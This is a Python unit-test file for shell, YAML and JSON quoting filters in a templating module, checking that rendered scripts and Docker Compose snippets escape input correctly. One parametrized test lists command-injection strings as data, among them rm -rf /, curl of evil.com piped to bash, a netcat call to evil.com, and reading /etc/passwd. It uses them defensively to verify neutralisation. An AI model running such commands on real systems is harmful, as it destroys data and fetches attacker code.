"""
Unit tests for enhanced template filters and command generation.

This module tests the new Jinja2 filters for secure command generation,
ensuring proper escaping and quoting of shell commands and YAML values.
"""

import shlex
import tempfile
from pathlib import Path

import pytest
import yaml

from panther.core.template.template_filters import (
    TEMPLATE_FILTERS,
    create_env_export,
    join_command_args,
    quote_json,
    quote_shell,
    quote_yaml,
)
from panther.core.template.template_renderer import TemplateRenderer


class TestTemplateFilters:
    """Test cases for template filters."""

    @pytest.mark.parametrize(
        "input_value,expected",
        [
            ("simple", "simple"),
            ("with spaces", "'with spaces'"),
            ("with'quote", "'with'\"'\"'quote'"),
            ('with"doublequote', "'with\"doublequote'"),
            ("with&ampersand", "'with&ampersand'"),
            ("with$dollar", "'with$dollar'"),
            ("with;semicolon", "'with;semicolon'"),
            ("with\nnewline", "'with\nnewline'"),
            ("", "''"),
            (None, ""),
            (123, "123"),
            (True, "True"),
        ],
    )
    def test_quote_shell(self, input_value, expected):
        """Test shell quoting with various edge cases."""
        result = quote_shell(input_value)
        assert result == expected

        # Verify that shlex can properly parse the result
        if result and result != "''":
            parsed = shlex.split(result)
            if input_value is not None:
                assert len(parsed) == 1
                assert parsed[0] == str(input_value)

    @pytest.mark.parametrize(
        "input_value,expected_type",
        [
            ("simple", str),
            ({"key": "value"}, str),
            ([1, 2, 3], str),
            (None, str),
            (123, str),
            (True, str),
        ],
    )
    def test_quote_yaml(self, input_value, expected_type):
        """Test YAML quoting produces valid YAML."""
        result = quote_yaml(input_value)
        assert isinstance(result, expected_type)

        # Verify that the result is valid YAML
        parsed = yaml.safe_load(result)
        assert parsed == input_value

    @pytest.mark.parametrize(
        "input_value",
        [
            "simple",
            "with spaces",
            "with'quotes",
            'with"doublequotes',
            "with\nnewlines",
            {"key": "value"},
            [1, 2, 3],
            None,
            123,
            True,
        ],
    )
    def test_quote_json(self, input_value):
        """Test JSON quoting produces valid JSON."""
        result = quote_json(input_value)

        # Verify that the result is valid JSON
        import json

        parsed = json.loads(result)
        assert parsed == input_value

    @pytest.mark.parametrize(
        "args,expected",
        [
            ([], ""),
            (["simple"], "simple"),
            (["arg1", "arg2"], "arg1 arg2"),
            (["with spaces", "normal"], "'with spaces' normal"),
            (["with'quote", 'with"quote'], "'with'\"'\"'quote' 'with\"quote'"),
            (["arg1", None, "arg3"], "arg1 arg3"),  # None values should be filtered out
            (
                ["/bin/sh", "-c", 'echo "Hello & Goodbye"'],
                "/bin/sh -c 'echo \"Hello & Goodbye\"'",
            ),
        ],
    )
    def test_join_command_args(self, args, expected):
        """Test command argument joining with proper quoting."""
        result = join_command_args(args)
        assert result == expected

    @pytest.mark.parametrize(
        "env_vars,expected_lines",
        [
            ({}, []),
            ({"PATH": "/usr/bin"}, ["export PATH=/usr/bin"]),
            ({"NAME": "value with spaces"}, ["export NAME='value with spaces'"]),
            (
                {"KEY1": "val1", "KEY2": "val2"},
                ["export KEY1=val1", "export KEY2=val2"],
            ),
            (
                {"COMPLEX": "val'with\"quotes&special"},
                ["export COMPLEX='val'\"'\"'with\"quotes&special'"],
            ),
        ],
    )
    def test_create_env_export(self, env_vars, expected_lines):
        """Test environment variable export creation."""
        result = create_env_export(env_vars)
        if not expected_lines:
            assert result == ""
        else:
            result_lines = result.split("\n")
            # Sort both lists since dictionary order might vary
            assert sorted(result_lines) == sorted(expected_lines)


class TestJinjaManagerIntegration:
    """Test JinjaManager integration with template filters."""

    @pytest.fixture
    def temp_template_dir(self):
        """Create a temporary directory with test templates."""
        with tempfile.TemporaryDirectory() as temp_dir:
            template_dir = Path(temp_dir) / "templates"
            template_dir.mkdir()

            # Create test templates
            (template_dir / "entrypoint.sh.jinja").write_text(
                """#!/usr/bin/env bash
set -e
{% for key, value in env_vars.items() %}
export {{ key | quote_shell }}={{ value | quote_shell }}
{% endfor %}
exec {{ command_args | join_command_args }}
"""
            )

            (template_dir / "docker_service.yml.jinja").write_text(
                """  {{ service_name }}:
    image: {{ image_name }}:{{ image_tag }}
    command:
      {% for arg in command_args %}
      - {{ arg | quote_yaml }}
      {% endfor %}
    environment:
      {% for key, value in env_vars.items() %}
      {{ key }}: {{ value | quote_yaml }}
      {% endfor %}
"""
            )

            yield template_dir

    def test_jinja_manager_has_filters(self, temp_template_dir):
        """Test that JinjaManager includes all template filters."""
        manager = TemplateRenderer(str(temp_template_dir))

        for filter_name in TEMPLATE_FILTERS.keys():
            assert filter_name in manager.jinja_env.filters

    @pytest.mark.parametrize(
        "cmd_args,env_vars,expected_snippet",
        [
            (
                ["/bin/sh", "-c", 'echo "Hello & Goodbye"'],
                {"PATH": "/usr/local/bin"},
                'echo "Hello & Goodbye"',
            ),
            (
                ["python3", "-m", "panther", "--config", "/path/to/config.yaml"],
                {},
                "panther --config /path/to/config.yaml",
            ),
            (["./test", "arg with spaces"], {"HOME": "/home/user"}, "arg with spaces"),
        ],
    )
    def test_entrypoint_template_rendering(
        self, temp_template_dir, cmd_args, env_vars, expected_snippet
    ):
        """Test entrypoint template rendering with edge cases."""
        manager = TemplateRenderer(str(temp_template_dir))

        context = {"command_args": cmd_args, "env_vars": env_vars}

        rendered = manager.render_template("entrypoint.sh.jinja", **context)

        # Check that the expected snippet appears properly quoted in the rendered script
        assert expected_snippet in rendered
        assert rendered.startswith("#!/usr/bin/env bash")
        assert "set -e" in rendered

        # If there are environment variables, check they're properly exported
        if env_vars:
            for key, value in env_vars.items():
                assert f"export {shlex.quote(key)}={shlex.quote(value)}" in rendered

    def test_docker_compose_template_rendering(self, temp_template_dir):
        """Test Docker Compose template rendering with proper YAML escaping."""
        manager = TemplateRenderer(str(temp_template_dir))

        context = {
            "service_name": "test_service",
            "image_name": "test_image",
            "image_tag": "latest",
            "command_args": ["/bin/sh", "-c", 'printf "hi & hi"'],
            "env_vars": {"FOO": "value with spaces", "BAR": "simple"},
        }

        rendered = manager.render_template("docker_service.yml.jinja", **context)

        # Validate YAML parses without error
        # Add proper YAML header for parsing
        yaml_content = "services:\n" + rendered
        parsed = yaml.safe_load(yaml_content)

        assert "services" in parsed
        assert "test_service" in parsed["services"]
        service = parsed["services"]["test_service"]

        assert service["image"] == "test_image:latest"
        assert service["command"][2] == 'printf "hi & hi"'
        assert service["environment"]["FOO"] == "value with spaces"
        assert service["environment"]["BAR"] == "simple"


class TestCommandGenerationEdgeCases:
    """Test edge cases that could cause security issues."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "'; rm -rf /; echo '",
            "$(curl evil.com/script.sh | bash)",
            "`cat /etc/passwd`",
            "&& wget evil.com/malware",
            "| nc evil.com 1234",
            "; shutdown -h now;",
            "\\n\\nrm -rf /\\n",
        ],
    )
    def test_malicious_input_neutralization(self, malicious_input):
        """Test that malicious inputs are properly neutralized."""
        # Test shell quoting
        quoted = quote_shell(malicious_input)
        assert malicious_input != quoted  # Should be different due to quoting

        # Parse with shlex to ensure it's treated as a single argument
        parsed = shlex.split(quoted)
        assert len(parsed) == 1
        assert parsed[0] == malicious_input

        # Test YAML quoting
        yaml_quoted = quote_yaml(malicious_input)
        yaml_parsed = yaml.safe_load(yaml_quoted)
        assert yaml_parsed == malicious_input

    def test_complex_command_args(self):
        """Test complex command argument scenarios."""
        complex_args = [
            "python3",
            "-c",
            'print("Hello & Goodbye"); import os; os.system("echo test")',
            "--config",
            "/path/with spaces/config.yaml",
            "--flag",
            "value'with\"quotes",
        ]

        result = join_command_args(complex_args)

        # Should be properly quoted and parseable
        parsed = shlex.split(result)
        assert parsed == complex_args

    def test_environment_variable_edge_cases(self):
        """Test environment variables with special characters."""
        env_vars = {
            "NORMAL": "simple_value",
            "WITH_SPACES": "value with spaces",
            "WITH_QUOTES": "value\"with'quotes",
            "WITH_SPECIAL": "value;with&special$chars",
            "EMPTY": "",
            "NUMERIC": "12345",
        }

        result = create_env_export(env_vars)

        # Each line should be a valid export statement
        lines = result.split("\n")
        for line in lines:
            assert line.startswith("export ")
            # Should be parseable by shell
            var_assignment = line[7:]  # Remove "export "
            assert "=" in var_assignment
